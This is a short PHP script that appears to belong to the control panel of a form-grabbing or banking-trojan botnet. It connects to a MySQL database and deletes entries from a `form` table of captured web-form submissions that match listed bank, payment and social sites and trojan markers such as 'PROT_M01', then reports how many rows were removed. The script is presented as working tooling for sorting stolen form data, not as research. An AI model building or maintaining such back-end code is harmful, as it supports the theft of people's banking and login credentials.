<?php

include_once('./mysqllog.php');

if(@!mysql_connect($mysql_host,$mysql_login,$mysql_pass)) {echo '<p class="err"> Error. Cant connect to mysql server </p>'; }
if(@!mysql_selectdb($mysql_db)) {echo '<p class="err"> Error. Cant connect to DB</p>'; }



$query[0] = 'DELETE FROM `form` WHERE `form` LIKE "%(PROT_M01)%";';
$query[1] = 'DELETE FROM `form` WHERE `form` LIKE "RequestString=%";';
$query[2] = 'DELETE FROM `form` WHERE `form` LIKE "%fortisbanking.be%";';
$query[3] = 'DELETE FROM `form` WHERE `form` LIKE "%centrum24.pl%";';
$query[4] = 'DELETE FROM `form` WHERE `form` LIKE "%expekt.com%";';
$query[5] = 'DELETE FROM `form` WHERE `form` LIKE "%squaretrade.com%";';
$query[6] = 'DELETE FROM `form` WHERE `form` LIKE "%orkut.com%";';
$query[7] = 'DELETE FROM `form` WHERE `form` LIKE "%rabobank.nl%";';
$query[8] = 'DELETE FROM `form` WHERE `form` LIKE "%clickbank.net%";';
$query[9] = 'DELETE FROM `form` WHERE `form` LIKE "%bps.uol.com.br%";';
$query[10] = 'DELETE FROM `form` WHERE `form` LIKE "%microsoft.com%";';
$query[11] = 'DELETE FROM `form` WHERE `form` LIKE "%mcafee.com%";';
$query[12] = 'DELETE FROM `form` WHERE `form` LIKE "%comincrediappserver.dll%";';
$query[13] = 'DELETE FROM `form` WHERE `form` LIKE "----------------------------%";';
$query[14] = 'DELETE FROM `form` WHERE `form` LIKE "%msehockey.com%";';
$query[15] = 'DELETE FROM `form` WHERE `form` LIKE "a=%"';
$query[16] = 'DELETE FROM `form` WHERE `form` LIKE "%goldenthreads.com%"';
$query[17] = 'DELETE FROM `form` WHERE `form` LIKE "%liveperson.net%"';
for ($i = 0; $i <= 17; $i++) {
	if(@!mysql_query($query[$i])) {echo '<p class="err"> Error. Cant execute query</p>';  }	
	printf("#%d Records deleted: %d <br>", $i, mysql_affected_rows());
}



?>